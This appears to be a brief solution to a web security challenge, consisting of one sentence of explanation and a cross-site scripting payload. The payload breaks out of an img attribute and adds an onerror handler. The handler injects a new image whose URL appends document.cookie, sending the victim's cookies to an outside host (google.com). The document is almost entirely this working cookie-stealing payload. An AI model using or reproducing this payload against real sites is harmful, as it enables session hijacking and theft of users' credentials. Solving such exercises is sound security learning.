# Solution

Terminate the img element then inject a new element.

```html
' onerror="document.getElementById('desc').innerHTML='<img src=&quot;http://google.com/' + document.cookie + '&quot;/>'" '
```
